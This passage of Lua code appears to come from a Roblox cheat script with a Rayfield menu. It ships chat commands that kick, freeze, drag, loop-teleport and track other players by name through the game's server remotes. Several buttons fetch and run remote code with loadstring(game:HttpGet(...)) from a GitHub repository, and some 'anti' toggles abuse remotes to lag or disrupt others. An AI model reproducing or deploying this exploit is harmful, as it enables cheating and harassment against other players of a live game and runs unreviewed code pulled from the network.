            tptopoisonTarget = nil
            Rayfield:Notify({
                Title = "Command Executed",
                Content = "Stopped loop TP poison",
                Duration = 3,
                Image = 7743876054,
            })
            
            elseif string.sub(msgLower, 1, 10) == "!tptowater" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                TPPlayerToWater(targetName)
                Rayfield:Notify({
                    Title = "Command Executed",
                    Content = "TP " .. targetName .. " to water",
                    Duration = 3,
                    Image = 7743876054,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
            
            elseif string.sub(msgLower, 1, 11) == "!blobfreeze" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                local success, message = ProcessBlobFreeze(targetName)
                Rayfield:Notify({
                    Title = success and " BlobFreeze Success" or " BlobFreeze Failed",
                    Content = success and "Froze " .. targetName or "Failed: " .. message,
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 15) == "!loopblobfreeze" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                blobFreezeTarget = targetName
                blobFreezeLoop = true
                task.spawn(BlobFreezeLoopFunc)
                Rayfield:Notify({
                    Title = " Loop BlobFreeze Started",
                    Content = "Loop freezing " .. targetName,
                    Duration = 3,
                    Image = 7743876054,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end

        elseif string.sub(msgLower, 1, 17) == "!unloopblobfreeze" then
            blobFreezeLoop = false
            blobFreezeTarget = nil
            Rayfield:Notify({
                Title = " Command Executed",
                Content = "Stopped loop blobfreeze",
                Duration = 3,
                Image = 7743876054,
            })
            
            elseif string.sub(msgLower, 1, 13) == "!switchplayer" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                SwitchPlayer()
                Rayfield:Notify({
                    Title = "Command Executed",
                    Content = "Switching with " .. targetName,
                    Duration = 3,
                    Image = 7743876054,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        elseif string.sub(msgLower, 1, 13) == "!loopblobkick" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                local success = BlobKickPlayer(targetName, true)
                Rayfield:Notify({
                    Title = success and "Loop Blobkick Started" or "Loop Blobkick Failed",
                    Content = success and "Loop blobkicking " .. targetName or "Failed to start loop blobkick",
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 15) == "!unloopblobkick" then
            LoopBlobkickActive = false
            BlobkickList = {}
            Rayfield:Notify({
                Title = "Command Executed",
                Content = "Stopped all loop blobkicks",
                Duration = 3,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 7) == "!pencil" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                local success = PencilPlayer(targetName, false)
                Rayfield:Notify({
                    Title = success and "Pencil Success" or "Pencil Failed",
                    Content = success and "Penciled " .. targetName or "Failed to pencil " .. targetName,
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 11) == "!looppencil" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                local success = PencilPlayer(targetName, true)
                Rayfield:Notify({
                    Title = success and "Loop Pencil Started" or "Loop Pencil Failed",
                    Content = success and "Loop penciling " .. targetName or "Failed to start loop pencil",
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 13) == "!unlooppencil" then
            LoopPencilActive = false
            PencilList = {}
            Rayfield:Notify({
                Title = "Command Executed",
                Content = "Stopped all loop pencils",
                Duration = 3,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 6) == "!bring" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                BringPlayer(targetName, false)
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 10) == "!loopbring" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
if targetName then
SelectedPlayer = targetName
LoopBringActive = true
BringPlayer(targetName, true)
else
Rayfield:Notify({
Title = "Error",
Content = "Player not found: " .. args[2],
Duration = 3,
Image = 7743878857,
})
end
    elseif string.sub(msgLower, 1, 12) == "!unloopbring" then
        LoopBringActive = false
        Rayfield:Notify({
            Title = "Command Executed",
            Content = "Stopped loop bring",
            Duration = 3,
            Image = 7743876054,
        })
    
    elseif string.sub(msgLower, 1, 5) == "!bang" and #args >= 2 then
        targetName = FindPlayerByPartialName(args[2])
        if targetName then
            SelectedPlayer = targetName
            BangPlayer(targetName, false)
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Player not found: " .. args[2],
                Duration = 3,
                Image = 7743878857,
            })
        end
    
    elseif string.sub(msgLower, 1, 9) == "!loopbang" and #args >= 2 then
        targetName = FindPlayerByPartialName(args[2])
        if targetName then
            SelectedPlayer = targetName
            LoopBangActive = true
            BangPlayer(targetName, true)
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Player not found: " .. args[2],
                Duration = 3,
                Image = 7743878857,
            })
        end
    
    elseif string.sub(msgLower, 1, 11) == "!unloopbang" then
        LoopBangActive = false
        Rayfield:Notify({
            Title = "Command Executed",
            Content = "Stopped loop bang",
            Duration = 3,
            Image = 7743876054,
        })
    
    elseif string.sub(msgLower, 1, 4) == "!esp" and #args >= 2 then
        targetName = FindPlayerByPartialName(args[2])
        if targetName then
            local success, msg = ToggleESP(targetName, true)
            Rayfield:Notify({
                Title = success and "ESP Enabled" or "ESP Error",
                Content = msg,
                Duration = 3,
                Image = success and 7743876054 or 7743878857,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Player not found: " .. args[2],
                Duration = 3,
                Image = 7743878857,
            })
        end
    
    elseif string.sub(msgLower, 1, 6) == "!noesp" and #args >= 2 then
        targetName = FindPlayerByPartialName(args[2])
        if targetName then
            local success, msg = ToggleESP(targetName, false)
            Rayfield:Notify({
                Title = success and "ESP Disabled" or "ESP Error",
                Content = msg,
                Duration = 3,
                Image = success and 7743876054 or 7743878857,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Player not found: " .. args[2],
                Duration = 3,
                Image = 7743878857,
            })
        end
    end
end
end)



--cmds ends there

Players = game:GetService("Players")
RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")
LocalPlayer = Players.LocalPlayer


PlayerTab:CreateParagraph({
    Title = "Current Player",
    Content = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. "), Thanks for using!"
})

PlayerTab:CreateButton({
    Name = "Destroy Rayfield",
    Callback = function()
        Rayfield:Destroy()
    end,
})

character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
humanoid = character:WaitForChild("Humanoid")
 hrp = character:WaitForChild("HumanoidRootPart")

LocalPlayer.CharacterAdded:Connect(function(char)
    character = char
    humanoid = char:WaitForChild("Humanoid")
    hrp = char:WaitForChild("HumanoidRootPart")
end)

PlayerTab:CreateSection("Quality")

local infJump = false
local infJumpConnection = nil

PlayerTab:CreateToggle({
    Name = "Infinite Jumps",
    CurrentValue = false,
    Callback = function(state)
        infJump = state
        if infJumpConnection then
            infJumpConnection:Disconnect()
            infJumpConnection = nil
        end
        if state then
            infJumpConnection = UserInputService.JumpRequest:Connect(function()
                if infJump and humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end)
        end
    end
})

Keybind = PlayerTab:CreateKeybind({
    Name = "Click TP",
    CurrentKeybind = "Z",
    HoldToInteract = false,
    Flag = "ClickTP",
    Callback = function(Keybind)
        if Mouse.Target then
            local char = me.Character
            if not char.Head.BallSocketConstraint.Enabled then
                char.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 3, 0)
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Velocity = Vector3.new()
                    end
                end
            else
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CFrame = Mouse.Hit + Vector3.new(0, 2.15, 0)
                    end
                end
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Velocity = Vector3.new()
                    end
                end
            end
        end
    end,
})


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- store originals
local originalMaxZoom
local originalMinZoom
local originalCameraMode
local originalMouseLock

PlayerTab:CreateToggle({
    Name = "Third person",
    Default = false,
    Callback = function(Value)

        if Value then
            -- save original settings
            originalMaxZoom = LocalPlayer.CameraMaxZoomDistance
            originalMinZoom = LocalPlayer.CameraMinZoomDistance
            originalCameraMode = LocalPlayer.CameraMode
            originalMouseLock = LocalPlayer.DevEnableMouseLock

            -- enable 3rd person camera
            LocalPlayer.CameraMaxZoomDistance = math.huge
            LocalPlayer.CameraMinZoomDistance = 0.5
            LocalPlayer.CameraMode = Enum.CameraMode.Classic

            -- ENABLE REAL SHIFTLOCK (CoreGui)
            pcall(function()
                LocalPlayer.DevEnableMouseLock = true
            end)

        else
            -- restore camera
            if originalMaxZoom then
                LocalPlayer.CameraMaxZoomDistance = originalMaxZoom
                LocalPlayer.CameraMinZoomDistance = originalMinZoom
                LocalPlayer.CameraMode = originalCameraMode
            end

            -- restore shiftlock setting
            if originalMouseLock ~= nil then
                pcall(function()
                    LocalPlayer.DevEnableMouseLock = originalMouseLock
                end)
            end
        end

    end
})

function StopVelocity()
    character = Player.Character
    if character then
        humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        end
    end
end

StopVelocityKeybind = PlayerTab:CreateKeybind({
    Name = "Stop Velocity",
    CurrentKeybind = "Q",
    HoldToInteract = false,
    Flag = "stop_velocity_keybind",
    Callback = function(Keybind)
        StopVelocity()
    end
})



PlayerTab:CreateSection("Morph's")

PlayerTab:CreateButton({
    Name = "Cleetus(Use anti kick before these)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yesawwwwwwd/OatsHubAssets/refs/heads/main/Cleetus"))()
    end
})

PlayerTab:CreateButton({
    Name = "Jester",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yesawwwwwwd/OatsHubAssets/refs/heads/main/Jester"))()
    end
})


PlayerTab:CreateButton({
    Name = "Phoenix",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yesawwwwwwd/OatsHubAssets/refs/heads/main/Phoenix"))()
    end
})

PlayerTab:CreateButton({
    Name = "Soul Reaper",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yesawwwwwwd/OatsHubAssets/refs/heads/main/SoulReaper"))()
    end
})

PlayerTab:CreateSection("Random")

local Button = PlayerTab:CreateButton({
   Name = "Use shader (rejoin to disable)",
   Callback = function()
   ShaderAdd()
   end,
})

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local animationId = "rbxassetid://6516424098"

local toolIds = {
	"74933357788345",
	"102857422393087",
	"95570933494259",
	"134249253751849",
	"11807672995",
	"111742964860677",
	"117497588447399",
	"133049525848154",
	"12209468706",
	"1305110271",
	"176245962",
	"7940963801",
	"25802861",
	"99773388",
	"112129898134988"
}

local function setupAnimatedTool(toolAssetId)
	local tool = game:GetObjects("rbxassetid://" .. toolAssetId)[1]
	if not tool then
		warn("Failed to load gear:", toolAssetId)
		return
	end

	tool.Parent = player:WaitForChild("Backpack")

	local animTrack

	tool.Equipped:Connect(function()
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")

		local animator = humanoid:FindFirstChildOfClass("Animator")
		if not animator then
			animator = Instance.new("Animator")
			animator.Parent = humanoid
		end

		if animTrack then
			animTrack:Stop()
			animTrack:Destroy()
		end

		local animation = Instance.new("Animation")
		animation.AnimationId = animationId

		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action4
		animTrack.Looped = true
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack:Destroy()
			animTrack = nil
		end
	end)
end


local Button = PlayerTab:CreateButton({
	Name = "Random Gear(send me gears plz i need more)",
	Callback = function()
		local randomId = toolIds[math.random(1, #toolIds)]
		setupAnimatedTool(randomId)
	end,
})

MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
SpawnToyRF = MenuToys:WaitForChild("SpawnToyRemoteFunction")


PlayerTab:CreateKeybind({
    Name = "Spawn Pallet",
    CurrentKeybind = "P",
    HoldToInteract = false,
    Callback = function()
        character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        HRP = character:WaitForChild("HumanoidRootPart")
        SpawnToyRF:InvokeServer("PalletLightBrown", HRP.CFrame * CFrame.new(0, -4, 0), Vector3.new(0, -1, 0))
    end,
})

PlayerTab:CreateSection("Waypoints")

Players = game:GetService("Players")
RunService = game:GetService("RunService")
Workspace = game:GetService("Workspace")
UserInputService = game:GetService("UserInputService")
GuiService = game:GetService("GuiService")
me = Players.LocalPlayer
Mouse = me:GetMouse()
hrp = HumanoidRootPart
Root = RootPart
CamPart = CamPart
FWC = nil



Player = game:GetService("Players").LocalPlayer
Camera = workspace.CurrentCamera
Mouse = Player:GetMouse()
UserInputService = game:GetService("UserInputService")
Inventory = workspace:WaitForChild(Player.Name .. "SpawnedInToys")
RunService = game:GetService("RunService")
Debris = game:GetService("Debris")



StarterGui = game:GetService("StarterGui")
PS = game:GetService("Players")
RS = game:GetService("ReplicatedStorage")
R = game:GetService("RunService")
Workspace = workspace
Player = PS.LocalPlayer
Camera = Workspace.CurrentCamera
CE = RS:WaitForChild("CharacterEvents", 10)
BeingHeld = Player:WaitForChild("IsHeld", 10)
StruggleEvent = CE and CE:WaitForChild("Struggle")
antiGucciConnection = nil
safePosition = nil
restoreFrames = 0
local function spawnBlobman()
    local args = {
        [1] = "CreatureBlobman",
        [2] = CFrame.new(0, 5000000, 0),
        [3] = Vector3.new(0, 60, 0)
    }
    pcall(function()
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(unpack(args))
    end)
    local folder = Workspace:WaitForChild(Player.Name .. "SpawnedInToys", 5)
    if folder and folder:FindFirstChild("CreatureBlobman") then
        local blob = folder.CreatureBlobman
        if blob:FindFirstChild("Head") then
            blob.Head.CFrame = CFrame.new(0, 50000, 0)
            blob.Head.Anchored = true
        end
    end
end
function startAntiGucci()
    local character = Player.Character or Player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")
    safePosition = rootPart.Position
    local folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
    local blob = folder and folder:FindFirstChild("CreatureBlobman")
    local seat = blob and blob:FindFirstChild("VehicleSeat")
    if not blob then
        spawnBlobman()
        task.wait(.5)
        folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
        blob = folder and folder:FindFirstChild("CreatureBlobman")
        seat = blob and blob:FindFirstChild("VehicleSeat")
    end
    if seat and seat:IsA("VehicleSeat") then
        rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
        seat:Sit(humanoid)
    end
    humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
        if humanoid.Jump and humanoid.Sit then
            restoreFrames = 15
            safePosition = rootPart.Position
        end
    end)
    if antiGucciConnection then
        antiGucciConnection:Disconnect()
    end
    antiGucciConnection = R.Heartbeat:Connect(function()
        if not rootPart or not humanoid then
            return
        end
        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
        if restoreFrames > 0 then
            rootPart.CFrame = CFrame.new(safePosition)
            restoreFrames = restoreFrames - 1
        end
    end)
    task.spawn(function()
        while humanoid.Sit do
            task.wait(.5)
        end
        task.wait(0.1)
        rootPart.CFrame = CFrame.new(safePosition)
    end)
end
function stopAntiGucci()
    if antiGucciConnection then
        antiGucciConnection:Disconnect()
        antiGucciConnection = nil
    end
    local blobFolder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
    if blobFolder and blobFolder:FindFirstChild("CreatureBlobman") then
        blobFolder.CreatureBlobman:Destroy()
    end
end

autoGucciActive = false

AntiTab:CreateToggle({
    Name = "Gucci anti (if you can't grab just turn off toggle :p)",
    CurrentValue = false,
    Flag = "GuciiiToggle",
    Callback = function(Value)
        autoGucciActive = Value
        if Value then
            startAntiGucci()
            task.spawn(function()
                while autoGucciActive do
                    local toysFolder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
                    local blobExists = toysFolder and toysFolder:FindFirstChild("CreatureBlobman")
                    if not blobExists then
                        stopAntiGucci()
                        spawnBlobman()
                        local retries = 0
                        repeat
                            task.wait(0.1)
                            retries = retries + 1
                            toysFolder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
                        until (toysFolder and toysFolder:FindFirstChild("CreatureBlobman")) or retries > 25 or not autoGucciActive
                        if autoGucciActive and toysFolder and toysFolder:FindFirstChild("CreatureBlobman") then
                            startAntiGucci()
                        end
                    end
                    task.wait(0.3)
                end
            end)
        else
            autoGucciActive = false
            stopAntiGucci()
        end
    end
})
--gucci end
AntiTab:CreateButton({
    Name = "Spawn Blobman",
    Callback = function()
        spawnBlobman()
    end
})

AntiTab:CreateButton({
    Name = "Sit on Blobman(to fix desyncs)",
    Callback = function()
        local blob = findBlobman()
        if blob then
            local seat = blob:FindFirstChild("VehicleSeat")
            local char = LocalPlayer.Character
            local humanoid = char and char:FindFirstChild("Humanoid")
            if seat and humanoid then
                seat:Sit(humanoid)
            end
        end
    end
})


plr = game:GetService("Players")
localdidi = plr.LocalPlayer
hookActive = false


function HookedPCLDBreak()
    hookActive = true
    char = localdidi.Character
    if not char then return end
    hrp = char:FindFirstChild("HumanoidRootPart")
    hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end

    killedAfterRespawn = false
    savedCFrame = hrp.CFrame
    hrp.CFrame = CFrame.new(hrp.Position.X, 50000, hrp.Position.Z)
    task.wait(0.05)
    hum.Health = 0

    localdidi.CharacterAdded:Once(function(newChar)
        newHrp = newChar:WaitForChild("HumanoidRootPart", 5)
        newHum = newChar:WaitForChild("Humanoid", 5)
        if newHrp and newHum then
            task.wait(0.1)
            newHrp.CFrame = savedCFrame
            if not killedAfterRespawn then
                killedAfterRespawn = true
                task.wait(0.05)
                newHum.Health = 0
            end
        end
    end)
end

AntiTab:CreateButton({
    Name = "Anti pcld",
    Callback = HookedPCLDBreak
})

AntiTab:CreateSection("Idk")
paintPartsBackup = {}
paintConnections = {}
function deleteAllPaintParts()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
            local clone = obj:Clone()
            clone.Archivable = true
            paintPartsBackup[obj:GetDebugId()] = {
                clone = clone,
                parent = obj.Parent
            }
            obj:Destroy()
        end
    end
end
function restorePaintParts()
    for _, data in pairs(paintPartsBackup) do
        if data.clone and data.parent then
            data.clone.Parent = data.parent
        end
    end
    paintPartsBackup = {}
end
function watchNewPaintParts()
    table.insert(paintConnections, Workspace.DescendantAdded:Connect(function(obj)
        if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
            task.defer(function()
                if obj and obj.Parent then
                    local clone = obj:Clone()
                    clone.Archivable = true
                    paintPartsBackup[obj:GetDebugId()] = {
                        clone = clone,
                        parent = obj.Parent
                    }
                    obj:Destroy()
                end
            end)
        end
    end))
end
function disconnectWatchers()
    for _, conn in ipairs(paintConnections) do
        if conn.Connected then
            conn:Disconnect()
        end
    end
    paintConnections = {}
end
function setTouchQuery(state)
    local char = Workspace:FindFirstChild(Player.Name)
    if not char then
        return
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:IsA("Part") or v:IsA("BasePart") then
            v.CanTouch = state
            v.CanQuery = state
        end
    end
end
	
AntiTab:CreateToggle({
    Name = "Anti Paint",
    CurrentValue = false,
    Flag = "AntiPaintToggle",
    Callback = function(state)
        if state then
            deleteAllPaintParts()
            watchNewPaintParts()
            setTouchQuery(false)
        else
            restorePaintParts()
            disconnectWatchers()
            setTouchQuery(true)
        end
    end
})
antiVoidConn = nil
VOID_THRESHOLD = - 50
SAFE_HEIGHT = 100
AntiTab:CreateToggle({
    Name = "Anti void",
    CurrentValue = false,
    Flag = "AntiPaintToggle",
    Callback = function(on)
        if on then
            if antiVoidConn then
                antiVoidConn:Disconnect()
            end
            antiVoidConn = R.Heartbeat:Connect(function()
                local char = Player.Character
                if char and char.PrimaryPart then
                    local pos = char.PrimaryPart.Position
                    if pos.Y < VOID_THRESHOLD then
                        local safePos = Vector3.new(pos.X, pos.Y + SAFE_HEIGHT, pos.Z)
                        char:SetPrimaryPartCFrame(CFrame.new(safePos))
                        char.PrimaryPart.AssemblyLinearVelocity = Vector3.zero
                    end
                end
            end)
        else
            if antiVoidConn then
                antiVoidConn:Disconnect()
                antiVoidConn = nil
            end
        end
    end
})
antiExplodeT = false
function antiExplodeF()
    antiExplodeT = true
    local char = Player.Character
    if not char then
        return
    end
    local hrp = char:WaitForChild("HumanoidRootPart")
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "Part" and antiExplodeT then
            local mag = (model.Position - hrp.Position).Magnitude
            if mag <= 20 then
                hrp.Anchored = true
                wait(0.001)
                while char["Right Arm"].RagdollLimbPart.CanCollide do
                    wait(0.0001)
                end
                hrp.Anchored = false
            end
        end
    end)
end
AntiTab:CreateToggle({
    Name = "Anti Explosion",
    CurrentValue = false,
    Flag = "AntiExToggle",
    Callback = function(on)
        if on then
            antiExplodeF()
        else
            antiExplodeT = false
        end
    end
})
anti_burn_enabled = false

function getCharacter(player)
    return player.Character or player.CharacterAdded:Wait()
end

function getHRP(character)
    return character and character:FindFirstChild("HumanoidRootPart")
end

function spawnOrGetFireExtinguisher(cframe)
    local toysFolder = workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys")
    if toysFolder then
        local tool = toysFolder:FindFirstChild("FireExtinguisher")
        if tool then
            return tool
        end
    end
    return game:GetService("ReplicatedStorage")
		.MenuToys
		.SpawnToyRemoteFunction
		:InvokeServer("FireExtinguisher", cframe, Vector3.new())
end

function destroyToy(toy)
    game:GetService("ReplicatedStorage")
		.MenuToys
		.DestroyToy
		:FireServer(toy)
end

function antiBurnLoop()
    while anti_burn_enabled do
        pcall(function()
            player = game.Players.LocalPlayer
            character = getCharacter(player)
            hrp = getHRP(character)
            if hrp and hrp:FindFirstChild("FireParticleEmitter") then
                fireExtinguisher = workspace[player.Name .. "SpawnedInToys"]:FindFirstChild("FireExtinguisher") or spawnOrGetFireExtinguisher(hrp.CFrame * CFrame.new(0, 100, 0))
                if fireExtinguisher and fireExtinguisher:FindFirstChild("ExtinguishPart") then
                    extinguishPart = fireExtinguisher.ExtinguishPart
                    while hrp:FindFirstChild("FireParticleEmitter") do
                        extinguishPart.Position = hrp.Position
                        extinguishPart.Size = Vector3.new(100, 100, 100)
                        game:GetService("RunService").Heartbeat:Wait()
                        extinguishPart.Position = Vector3.new(- 1000, 0, 0)
                        game:GetService("RunService").Heartbeat:Wait()
                    end
                    destroyToy(fireExtinguisher)
                    task.wait(0.001)
                end
            end
        end)
        task.wait(0.001)
    end
end
AntiTab:CreateToggle({
    Name = "Anti Burn",
    Default = false,
    Callback = function(Value)
        anti_burn_enabled = Value
        if Value then
            task.spawn(antiBurnLoop)
        end
    end
})
AntiVoid = AntiTab:CreateToggle({
    Name = "Delete void",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        antiboid = Value
        if Value then 
            workspace.FallenPartsDestroyHeight = 0 / 0
            Rayfield:Notify({
                Title = "Void has been disabled",
                Content = "Anti-Void",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            workspace.FallenPartsDestroyHeight = - 100
            Rayfield:Notify({
                Title = "Void has been enabled",
                Content = "Anti-Void",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

AntiTab:CreateSection("Anti blob")

RunService = game:GetService("RunService")
 Players = game:GetService("Players")
 player = Players.LocalPlayer


 enabled = false
hbConn = nil

 coco = nil
 holdRemote = nil
 dropRemote = nil

MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
DestroyToy = MenuToys:WaitForChild("DestroyToy")

function spawnCoconut()
    local toysFolder = workspace:WaitForChild(player.Name.."SpawnedInToys", 2)
    if not toysFolder then return false end

    MenuToys.SpawnToyRemoteFunction:InvokeServer(
        "FoodCoconut",
        CFrame.new(-72.93, -5.97, -265.54),
        Vector3.new(0,90,0)
    )

    coco = toysFolder:WaitForChild("FoodCoconut", 2)
    if not coco then return false end

    local holdPart = coco:WaitForChild("HoldPart", 1)
    if not holdPart then return false end

    holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
    dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")

    return holdRemote and dropRemote
end

 function destroyCoconut()
    if coco and coco.Parent then
        pcall(function()
            if DestroyToy.FireServer then
                DestroyToy:FireServer(coco)
            elseif DestroyToy.InvokeServer then
                DestroyToy:InvokeServer(coco)
            end
        end)
    end
end

function startLoop()
    hbConn = RunService.Heartbeat:Connect(function()
        if not enabled then return end

        local character = player.Character
        local head = character and character:FindFirstChild("Head")

        if not coco or not coco.Parent then
            spawnCoconut()
            return
        end

        if not holdRemote or not dropRemote or not head then return end

        pcall(function()
            holdRemote:InvokeServer(coco, character)
            dropRemote:InvokeServer(
                coco,
                CFrame.new(head.Position + Vector3.new(0,10,0)),
                --0,10,10 original
                Vector3.zero
            )
        end)
    end)
end

AntiTab:CreateToggle({
    Name = "Input Lag coconut",
    CurrentValue = false,
    Callback = function(state)
        enabled = state

        if state then
            startLoop()
        else
            if hbConn then
                hbConn:Disconnect()
                hbConn = nil
            end

            destroyCoconut()

            coco = nil
            holdRemote = nil
            dropRemote = nil
        end
    end
})

antiblob = false

AntiTab:CreateToggle({
    Name = "Anti Blob",
    CurrentValue = false,
    Flag = "AntiBlobKick",
    Callback = function(Value)
        antiblob = Value
        
        player = game:GetService("Players").LocalPlayer
        workspace = game:GetService("Workspace")
        
        if antiblob then
            if player.Character then
                if not player.Character:FindFirstChild("TruePositionPart") then
                    truePosPart = Instance.new("Part")
                    truePosPart.Parent = player.Character
                    truePosPart.Name = "TruePositionPart"
                    truePosPart.Anchored = true
                    truePosPart.Transparency = 1
                    truePosPart.CanCollide = false
                    truePosPart.Size = Vector3.new(0.1, 0.1, 0.1)
                    truePosPart.CFrame = CFrame.new(0, - 10000, 0)
                end
            end
        end
        
        while antiblob and task.wait() do
            if player.Character then
                hrp = player.Character:FindFirstChild("HumanoidRootPart")
                truePosPart = player.Character:FindFirstChild("TruePositionPart")
                
                if hrp and truePosPart then
                    rootAttachment = hrp:FindFirstChild("RootAttachment")
                    
                    if rootAttachment and rootAttachment.Parent == hrp then
                        rootAttachment.Parent = truePosPart
                        print("Anti-Blob (tf happened here?) TruePositionPart")
                    end
                    
                    for _, part in pairs(player.Character:GetChildren()) do
                        if part:IsA("Part") and part.Massless then
                            part.Massless = false
                            
                            function kickFromBlob()
                                for _, plot in pairs(workspace.PlotItems:GetChildren()) do
                                    if plot.Name ~= "PlayersInPlots" then
                                        for _, item in pairs(plot:GetChildren()) do
                                            if item.Name == "CreatureBlobman" then
                                                blobScript = item:FindFirstChild("BlobmanSeatAndOwnerScript")
                                                rightDetector = item:FindFirstChild("RightDetector")
                                                leftDetector = item:FindFirstChild("LeftDetector")
                                                
                                                if blobScript and rightDetector and leftDetector then
                                                    dropEvent = blobScript:FindFirstChild("CreatureDrop")
                                                    rightWeld = rightDetector:FindFirstChild("RightWeld")
                                                    leftWeld = leftDetector:FindFirstChild("LeftWeld")
                                                    
                                                    if dropEvent and rightWeld and hrp then
                                                        dropEvent:FireServer(rightWeld, hrp)
                                                    end
                                                    
                                                    if dropEvent and leftWeld and hrp then
                                                        dropEvent:FireServer(leftWeld, hrp)
                                                    end
                                                    
                                                    if replicatedStorage:FindFirstChild("CharacterEvents") then
                                                        struggleEvent = replicatedStorage.CharacterEvents:FindFirstChild("Struggle")
                                                        if struggleEvent then
                                                            struggleEvent:FireServer(player)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                
                                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                                    toyFolder = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
                                    if toyFolder then
                                        for _, item in pairs(toyFolder:GetChildren()) do
                                            if item.Name == "CreatureBlobman" then
                                                blobScript = item:FindFirstChild("BlobmanSeatAndOwnerScript")
                                                rightDetector = item:FindFirstChild("RightDetector")
                                                leftDetector = item:FindFirstChild("LeftDetector")
                                                
